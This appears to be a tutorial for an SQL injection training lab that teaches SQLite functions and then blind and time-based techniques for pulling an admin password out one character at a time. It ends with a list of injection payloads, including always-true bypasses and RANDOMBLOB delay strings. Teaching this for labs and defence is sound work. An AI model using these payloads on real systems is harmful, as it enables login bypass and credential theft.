# 🚀 Advanced SQL for Expert-Level Injection

Master advanced SQL techniques needed for EXPERT, BLIND, and TIME-BASED injection challenges.

---

## 🎯 Why Advanced SQL?

The expert levels require understanding:
- String manipulation functions
- Conditional logic (CASE statements)
- Subqueries
- System metadata tables
- Boolean-based extraction
- Time-based techniques

---

## 📚 String Functions

### SUBSTR() - Extract Substrings

**Syntax:**
```sql
SUBSTR(string, start_position, length)
```

**Examples:**
```sql
-- Get first character of password
SELECT SUBSTR(password, 1, 1) FROM users WHERE email = 'admin@example.com'
-- Returns: 'a'

-- Get first 3 characters
SELECT SUBSTR(password, 1, 3) FROM users WHERE email = 'admin@example.com'
-- Returns: 'adm'

-- Get 2nd character
SELECT SUBSTR(password, 2, 1) FROM users WHERE email = 'admin@example.com'
-- Returns: 'd'
```

**Why It's Important:**
Used in blind injection to extract data character by character!

---

### LENGTH() - String Length

**Syntax:**
```sql
LENGTH(string)
```

**Examples:**
```sql
-- Get password length
SELECT LENGTH(password) FROM users WHERE email = 'admin@example.com'
-- Returns: 8 (for 'admin123')

-- Find users with long passwords
SELECT email FROM users WHERE LENGTH(password) > 5
```

**Injection Use:**
Determine how many characters to extract in blind injection.

---

### LIKE - Pattern Matching

**Syntax:**
```sql
column LIKE 'pattern'
```

**Wildcards:**
- `%` - Matches any sequence of characters
- `_` - Matches exactly one character

**Examples:**
```sql
-- All emails ending with example.com
SELECT * FROM users WHERE email LIKE '%example.com'

-- Emails starting with 'admin'
SELECT * FROM users WHERE email LIKE 'admin%'

-- Match any email (always true!)
SELECT * FROM users WHERE email LIKE '%'

-- Password starts with 'a'
SELECT * FROM users WHERE password LIKE 'a%'
```

**Injection Use:**
Bypass filters, create always-true conditions.

---

## 🔀 Conditional Logic - CASE

### CASE Statement

**Syntax:**
```sql
CASE 
  WHEN condition1 THEN result1
  WHEN condition2 THEN result2
  ELSE default_result
END
```

**Examples:**
```sql
-- Classify users by role
SELECT email,
  CASE 
    WHEN role = 'admin' THEN 'Administrator'
    WHEN role = 'user' THEN 'Regular User'
    ELSE 'Unknown'
  END as user_type
FROM users

-- Check if password starts with 'a'
SELECT email,
  CASE 
    WHEN SUBSTR(password, 1, 1) = 'a' THEN 'YES'
    ELSE 'NO'
  END as starts_with_a
FROM users
```

**Injection Use:**
- Blind injection: Test conditions and get YES/NO responses
- Time-based injection: Trigger delays conditionally

---

## 🔍 Subqueries

### What Are Subqueries?

A query inside another query.

**Examples:**
```sql
-- Find users with same role as admin
SELECT * FROM users 
WHERE role = (SELECT role FROM users WHERE email = 'admin@example.com')

-- Get total user count in each row
SELECT email, 
  (SELECT COUNT(*) FROM users) as total_users 
FROM users

-- Find users with above-average password length
SELECT email FROM users 
WHERE LENGTH(password) > (SELECT AVG(LENGTH(password)) FROM users)
```

**Injection Use:**
Extract data from other tables or aggregate information.

---

## 🗄️ System Metadata - sqlite_master

### What Is sqlite_master?

A special system table containing database structure information.

**Columns:**
- `type` - Object type (table, index, view)
- `name` - Object name
- `tbl_name` - Associated table name
- `sql` - CREATE statement

**Examples:**
```sql
-- List all tables
SELECT name FROM sqlite_master WHERE type = 'table'
-- Returns: users

-- Get table structure
SELECT sql FROM sqlite_master WHERE name = 'users'
-- Returns: CREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, password TEXT, role TEXT)

-- List all objects
SELECT type, name FROM sqlite_master
```

**Injection Use:**
Discover database structure, table names, column names.

---

## 🎭 Boolean-Based Blind Injection

### Concept

Extract data by asking TRUE/FALSE questions.

### Technique

**Step 1: Test if injection works**
```sql
-- TRUE condition (login succeeds)
SELECT * FROM users WHERE email = 'admin@example.com' AND '1'='1'

-- FALSE condition (login fails)
SELECT * FROM users WHERE email = 'admin@example.com' AND '1'='2'
```

**Step 2: Extract password length**
```sql
-- Is password length 8?
SELECT * FROM users WHERE email = 'admin@example.com' AND LENGTH(password) = 8
-- If login succeeds, length is 8!

-- Is password length > 10?
SELECT * FROM users WHERE email = 'admin@example.com' AND LENGTH(password) > 10
-- If login fails, length is <= 10
```

**Step 3: Extract password character by character**
```sql
-- Is first character 'a'?
SELECT * FROM users WHERE email = 'admin@example.com' AND SUBSTR(password, 1, 1) = 'a'
-- If login succeeds, first char is 'a'!

-- Is second character 'd'?
SELECT * FROM users WHERE email = 'admin@example.com' AND SUBSTR(password, 2, 1) = 'd'

-- Is third character 'm'?
SELECT * FROM users WHERE email = 'admin@example.com' AND SUBSTR(password, 3, 1) = 'm'
```

**Step 4: Automate**
Test each character a-z, 0-9 until you find matches.

---

## ⏱️ Time-Based Blind Injection

### Concept

Extract data by measuring response time delays.

### SQLite Time Delay

SQLite doesn't have SLEEP(), but we can use CPU-intensive operations:

```sql
RANDOMBLOB(100000000)  -- Creates 100MB random data (slow!)
```

### Technique

**Step 1: Test delay**
```sql
-- Cause 3-second delay
SELECT * FROM users WHERE email = 'admin@example.com' AND RANDOMBLOB(100000000)
-- Response time: ~3000ms
```

**Step 2: Conditional delay**
```sql
-- Delay only if condition is TRUE
SELECT * FROM users WHERE email = 'admin@example.com' AND 
  CASE 
    WHEN SUBSTR(password, 1, 1) = 'a' THEN RANDOMBLOB(100000000)
    ELSE 1
  END

-- If first char is 'a': Response time ~3000ms
-- If first char is NOT 'a': Response time ~50ms
```

**Step 3: Extract data**
```sql
-- Test each character
-- If 'a': CASE WHEN SUBSTR(password,1,1)='a' THEN RANDOMBLOB(100000000) ELSE 1 END
-- If 'b': CASE WHEN SUBSTR(password,1,1)='b' THEN RANDOMBLOB(100000000) ELSE 1 END
-- ... continue until you find the delay (correct character)
```

---

## 🎯 Aggregate Functions

### COUNT() - Count Rows

```sql
-- Total users
SELECT COUNT(*) FROM users
-- Returns: 3

-- Count by role
SELECT role, COUNT(*) as count FROM users GROUP BY role
-- Returns: admin: 1, user: 2
```

### GROUP BY - Group Results

```sql
-- Users per role
SELECT role, COUNT(*) as count FROM users GROUP BY role

-- Average password length by role
SELECT role, AVG(LENGTH(password)) as avg_pwd_len FROM users GROUP BY role
```

---

## 🔧 Practical Examples

### Example 1: Extract Database Version
```sql
SELECT sqlite_version()
-- Returns: 3.40.1
```

### Example 2: Find All Tables
```sql
SELECT name FROM sqlite_master WHERE type='table'
-- Returns: users
```

### Example 3: Get Table Structure
```sql
SELECT sql FROM sqlite_master WHERE name='users'
-- Returns: CREATE TABLE users (id INTEGER, email TEXT, password TEXT, role TEXT)
```

### Example 4: Boolean Blind - Test Password First Char
```sql
-- Test if first character is 'a'
SELECT * FROM users WHERE email = 'admin@example.com' AND SUBSTR(password,1,1)='a'
-- Success = TRUE, Fail = FALSE
```

### Example 5: Time-Based - Extract Password
```sql
-- If first char is 'a', delay 3 seconds
SELECT * FROM users WHERE email = 'admin@example.com' AND 
  CASE WHEN SUBSTR(password,1,1)='a' THEN RANDOMBLOB(100000000) ELSE 1 END
-- Watch response time!
```

---

## 💡 Injection Patterns

### Pattern 1: Always True
```sql
' OR '1'='1
' OR 1=1 --
' OR 'x'='x
```

### Pattern 2: Always False
```sql
' AND '1'='2
' AND 1=2 --
```

### Pattern 3: Boolean Test
```sql
' AND SUBSTR(password,1,1)='a
' AND LENGTH(password)=8 --
```

### Pattern 4: Time-Based
```sql
' AND RANDOMBLOB(100000000) AND '1'='1
' AND CASE WHEN SUBSTR(password,1,1)='a' THEN RANDOMBLOB(100000000) ELSE 1 END --
```

### Pattern 5: LIKE Wildcard
```sql
' OR email LIKE '%
' OR password LIKE 'a%
```

---

## 🎓 Practice Exercises

### Exercise 1: String Functions
```sql
-- Get first 3 characters of all passwords
SELECT email, SUBSTR(password, 1, 3) FROM users

-- Find users with passwords longer than 6 characters
SELECT email FROM users WHERE LENGTH(password) > 6
```

### Exercise 2: CASE Statements
```sql
-- Label users by password length
SELECT email,
  CASE 
    WHEN LENGTH(password) < 6 THEN 'Weak'
    WHEN LENGTH(password) < 10 THEN 'Medium'
    ELSE 'Strong'
  END as password_strength
FROM users
```

### Exercise 3: Subqueries
```sql
-- Find users with same role as admin
SELECT * FROM users 
WHERE role = (SELECT role FROM users WHERE email = 'admin@example.com')
```

### Exercise 4: System Metadata
```sql
-- Discover all tables
SELECT name FROM sqlite_master WHERE type='table'

-- Get users table structure
SELECT sql FROM sqlite_master WHERE name='users'
```

### Exercise 5: Boolean Logic
```sql
-- Test if admin password starts with 'a'
SELECT * FROM users 
WHERE email = 'admin@example.com' AND SUBSTR(password,1,1)='a'
```

---

## 🚀 Ready for Expert Levels?

Once you're comfortable with:
- ✅ SUBSTR() and LENGTH()
- ✅ CASE statements
- ✅ Subqueries
- ✅ sqlite_master
- ✅ Boolean logic
- ✅ Time-based concepts

You're ready to tackle:
- 🟣 EXPERT (WAF bypass)
- 🔵 BLIND (boolean-based extraction)
- ⏱️ TIME-BASED (timing attacks)

---

## 📊 Quick Reference

| Technique | SQL Example | Use Case |
|-----------|-------------|----------|
| SUBSTR | `SUBSTR(password,1,1)='a'` | Extract characters |
| LENGTH | `LENGTH(password)=8` | Determine length |
| CASE | `CASE WHEN...THEN...END` | Conditional logic |
| LIKE | `email LIKE '%'` | Pattern matching |
| Subquery | `(SELECT role FROM users)` | Nested queries |
| sqlite_master | `SELECT name FROM sqlite_master` | Database structure |
| Boolean | `'1'='1'` (true), `'1'='2'` (false) | Blind injection |
| Time-based | `RANDOMBLOB(100000000)` | Timing attacks |

---

**Master these techniques to become an SQL injection expert!** 🚀🔐
